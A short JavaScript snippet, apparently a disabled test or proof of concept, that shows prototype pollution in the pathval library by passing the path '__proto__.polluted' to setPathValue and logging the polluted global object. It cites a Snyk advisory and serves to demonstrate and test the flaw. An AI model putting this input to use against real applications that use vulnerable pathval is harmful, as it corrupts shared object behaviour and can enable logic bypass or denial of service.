// //https://snyk.io/vuln/SNYK-JS-PATHVAL-596926
// test("prototype pollution in pathval", () => {
  var pathval = require("pathval");

  var obj = {};
console.log({}.polluted);

  pathval.setPathValue(obj, "__proto__.polluted", "yes");
console.log({}.polluted);
// });
